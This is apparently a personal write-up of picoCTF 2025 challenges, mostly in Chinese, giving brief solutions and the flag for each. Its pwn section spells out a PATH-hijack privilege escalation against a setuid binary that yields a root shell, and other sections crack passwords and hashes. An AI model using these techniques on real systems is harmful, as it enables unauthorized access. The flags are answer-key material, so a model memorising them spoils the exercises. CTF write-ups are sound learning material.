---
title: picoCTF 2025 - write-up
published: 2025-03-18
description: '紀錄在 picoCTF 2025 competition 中所解的題目'
image: 'image.jpg'
tags: [CTF,write-up,Cyber Secutity]
category: 'CTF'
draft: true
---

## Result

![image](image01.png)
![image](image-02.png)

## Web

### WebSockFish 

這是一個西洋棋樣子的 web  
![image](image-03.png)

當我們下爛掉的時候，可以發現他發送的 websocket 的 value 變大了 （下圖右邊的 ws eval value）
![image](image-04.png)
我們可以試試看，送出負的 value
```javascript
ws.send("eval -9999999");
```
![image](image-05.png)


> picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_e5e75e69}

### Pachinko

這一題只能說，一點都看不懂他在幹嘛，但我弄一弄就解出來了 xD  
知道了以後會更新的！

## Crypto

### hashcrack

看題目就知道，題目跟 hash 爆破有關  
直接把 hash 值丟到 [這邊](https://crackstation.net/)
![image](image-06.png)

> picoCTF{UseStr0nG_h@shEs_&PaSswDs!_ce730f64}


### Guess My Cheese (Part 1)

Hints: affinity for linear equations 
代表說這些 c （密文） 跟 p （明文） 之間有線性關係
先連上去看看
![image](image-07.png)
這邊他有加密跟猜測兩個選項  
先試試看加密
![image](image-08.png)
得到了 c 跟 p ， 這樣我們就可以解方程式
![image](image-09.png)
得出 A = 11 , B = 5
這樣就可以解密
![image](image-10.png)
> picoCTF{ChEeSy1ff8ae0d}

## Reverse

### Flag Hunters

REFRAIN;RETURN 0;

> picoCTF{70637h3r_f0r3v3r_a3d964ee}

### Quantum Scrambler

除了工人智慧以外，目前還沒有看到其他的 write-up

> picoCTF{python_is_weirdf82598d6}

### Binary Instrumentation 1

利用 Frida 去逆向 patch JS 函式

> picoCTF{w4ke_m3_up_w1th_fr1da_f27acc38}

## Forensics

### RED

Metadata 查看過後發現有藏頭詩
```
Crimson heart, vibrant and bold,.
Hearts flutter at your sight..
Evenings glow softly red,.
Cherries burst with sweet life..
Kisses linger with your warmth..
Love deep as merlot..
Scarlet leaves falling softly,.
Bold in every stroke.
```

check LSB 
使用 zsteg 來檢查
發現了奇怪的東西
b1,rgba,lsb,xy      .. text: "cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==..."

拿去 base64 解碼 就有了
> picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}

### Ph4nt0m 1ntrud3r

Sort the packets in chronological order, extract the content, and then decode it using Base64.
```python
import base64

encoded_strings = [
    "cGljb0NURg==",
    "ezF0X3c0cw==",
    "bnRfdGg0dA==",
    "XzM0c3lfdA==", 
    "YmhfNHJfZQ==",
    "NWU4Yzc4ZA==",
    "fQ==",
]

flag = ""

decoded_strings = []
for enc in encoded_strings:
    try:
        decoded = base64.b64decode(enc).decode("utf-8")
        decoded_strings.append(decoded)
    except Exception:
        decoded_strings.append(f"Error decoding: {enc}")

for decoded in decoded_strings:
    flag += decoded
print(flag)
```


> picoCTF{1t_w4snt_th4t_34sy_tbh_4r_e5e8c78d}

### Event-Viewing

event ID 1074, 1033, 4567
> picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_81ba3fe9}

### Bitlocker-1

推薦使用 WSL 
這邊利用 John 去爆破 hash
再利用 hashcat 破密碼
最後掛載檔案 拿到 Flag

> picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_3242adb1}

## Pwn

### PIE TIME

main address - offset = win function address
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_93dd5fcb}

### hash-only-1

經典的 Privilege Escalation 
首先 先靜態逆向觀察
可以發現以下的 code 
std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string(
    v13,
    "/bin/bash -c 'md5sum /root/flag.txt'",
    &v11);
...
  setgid(0);
  setuid(0);
...
v12 = system(v5);

然後發現了執行檔的權限控制如下
-rwsr-xr-x 1 root root 18312 Mar  6 03:45 flaghasher

代表說 一般 user 執行這個檔案 是利用 root 權限
我們可以嘗試利用環境變數來替換掉 system() 執行的命令

echo -e '#!/bin/bash\n/bin/bash' > /tmp/md5sum
chmod +x /tmp/md5sum
export PATH=/tmp:$PATH
./flaghasher


這樣我們可以順利取得 root shell ，然後 get flag
cat /root/flag.txt
> picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_9722baa4}

### hash-only-2

跟上個題目一樣，只是初始的 bash 換成了 rbash
之後的流程都一樣
> picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_aeecb174} 
